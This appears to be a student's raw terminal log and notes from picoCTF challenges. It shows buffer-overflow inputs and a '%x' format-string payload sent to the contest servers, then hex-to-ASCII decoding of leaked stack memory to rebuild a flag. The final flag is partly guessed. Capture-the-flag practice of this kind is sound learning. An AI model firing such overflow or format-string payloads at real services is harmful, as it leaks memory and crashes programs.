earthwarrior@LAPTOP-VLDN28C5:~$ nc saturn.picoctf.net 53208
Input: wqeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}

_______________________________________________________________________________________________________

earthwarrior@LAPTOP-VLDN28C5:~$ nc mimas.picoctf.net 59065
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: 1e2qwe21.#\
There is no such burger yet!

earthwarrior@LAPTOP-VLDN28C5:~$ nc mimas.picoctf.net 59065
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
There is no such burger yet!

picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}

_______________________________________________________

earthwarrior@LAPTOP-VLDN28C5:~$ nc saturn.picoctf.net 50585
Tell me a story and then I'll tell you one >> qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
Here's a story -
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq&&&&&&&&&&&&&&


qew
eqweqeqeqeqeq
^Z
[1]+  Stopped                 nc saturn.picoctf.net 50585
earthwarrior@LAPTOP-VLDN28C5:~$ nc saturn.picoctf.net 50585
Tell me a story and then I'll tell you one >> \0
Here's a story -
\0

^Z
[2]+  Stopped                 nc saturn.picoctf.net 50585
earthwarrior@LAPTOP-VLDN28C5:~$ nc saturn.picoctf.net 50585
Tell me a story and then I'll tell you one >> %s
Here's a story -
%s
^C
earthwarrior@LAPTOP-VLDN28C5:~$ nc saturn.picoctf.net 50585
Tell me a story and then I'll tell you one >> flag.txt
Here's a story -
flag.txt





https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/




earthwarrior@LAPTOP-VLDN28C5:~$ nc saturn.picoctf.net 53394
Tell me a story and then I'll tell you one >> %x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x
Here's a story -
ff9a22c0:ff9a22e0:8049346:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:253a78:6f636970:7b465443:6b34334c:5f676e31:67346c46:6666305f:3474535f:

by copy pasting into a hexadec to text website https://www.rapidtables.com/convert/number/hex-to-ascii.html
we get
ÿ"Àÿ"àI4bS§WS§§S¢S§WS§§S¢S§WS§§S¢S§WS§§S¢S§WS§§S¢S§WS§§S¢S§WS§§S¢S§WS§§S¢S§WS§§S¢S§WS§§S¢S§RS§ö6´eD6³C4ÅövãsFÄffcóGE5


after some trail and error i just deleted part of the initial text
now translating 
78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:253a78:6f636970:7b465443:6b34334c:5f676e31:67346c46:6666305f:3474535f:
we get
x%:x:x%:%:x%x%:x:x%:%:x%x%:x:x%:%:x%x%:x:x%:%:x%x%:x:x%:%:x%x%:x:x%:%:x%x%:x:x%:%:x%x%:x:x%:%:x%x%:x:x%:%:x%%:xocip{FTCk43L_gn1g4lFff0_4tS_

of which ocip{FTCk43L_gn1g4lFff0_4tS_ looks like the flag but jumbled
{k43L_gn1 g4lF ff0_ 4tS _     |  picoCTF{L34king_Fl4g_0ff_St4_}
